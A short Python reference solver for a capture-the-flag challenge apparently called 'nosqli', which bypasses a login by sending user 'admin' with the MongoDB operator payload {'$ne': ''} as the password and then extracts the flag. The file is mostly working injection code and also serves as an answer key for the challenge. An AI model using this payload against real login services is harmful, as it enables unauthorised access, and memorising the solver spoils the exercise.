"""Reference solver for nosqli: MongoDB-style operator injection auth bypass.

    python3 solve.py <host> <port>
"""
import json, re, sys, urllib.request

def main():
    host, port = sys.argv[1], sys.argv[2]
    body = json.dumps({"user": "admin", "pass": {"$ne": ""}}).encode()
    req = urllib.request.Request(f"http://{host}:{port}/login", data=body,
                                 headers={"Content-Type": "application/json"})
    data = json.loads(urllib.request.urlopen(req, timeout=15).read())
    m = re.search(r"flag\{[^}]*\}", data.get("flag", "") or json.dumps(data))
    print(m.group(0) if m else data)

if __name__ == "__main__":
    main()
